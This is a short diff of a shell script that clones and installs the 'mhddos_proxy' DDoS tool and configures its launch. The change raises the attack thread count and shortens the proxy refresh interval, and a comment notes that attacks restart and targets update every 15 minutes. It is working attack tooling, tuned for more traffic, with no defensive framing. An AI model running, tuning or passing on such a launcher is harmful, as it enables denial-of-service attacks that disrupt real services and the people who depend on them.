@@ -9,9 +9,9 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
-threads="${1:-1600}"; threads="-t $threads"
+threads="${1:-2000}"; threads="-t $threads"
 rpc="--rpc 2000"
-proxy_timer_update="-p 600"
+proxy_timer_update="-p 350"
 debug="--debug"
 
 # Restart attacks and update targets every 15 minutes
